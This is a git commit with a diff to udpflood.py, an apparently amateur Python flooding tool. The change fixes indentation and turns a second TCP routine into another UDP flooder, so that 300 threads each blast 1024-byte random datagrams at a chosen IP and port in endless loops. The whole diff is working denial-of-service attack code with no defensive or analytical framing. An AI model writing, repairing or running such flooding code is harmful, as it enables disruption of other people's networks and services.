6458d689506b621b697b16f548718b814cc77404
rikuru-to865 <usaginosippo865@gmail.com>
2021-04-02 14:26:48 +0900

    fixed indent eroor

--- udpflood.py
+++ udpflood.py
@@ -9,7 +9,7 @@ port = 0
 choice = ""
 times = 10000
 threads = 300
-flag == True
+flag = True
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -19,35 +19,32 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-        if flag == False:
-          return
-			  print(i +" Sent!!!")
-
-      
+			if flag == False:
+			  return
+			print(i +" Sent!!!")
 		except:
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Sent!!!")
-		except:
-			s.close()
-			print("[*] Error")
+  data = random._urandom(1024)
+  i = random.choice(("[*]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      if flag == False:
+        return
+    except:
+      pass
 
 
 def mainudp():
-    for y in range(threads):
-    	if choice == 'y':
-    		th = threading.Thread(target = run)
-    		th.start()
-    	else:
-    		th = threading.Thread(target = run2)
-    		th.start()
+	for y in range(threads):
+		if choice == 'y':
+			th = threading.Thread(target = run)
+			th.start()
+		else:
+			th = threading.Thread(target = run2)
+			th.start()
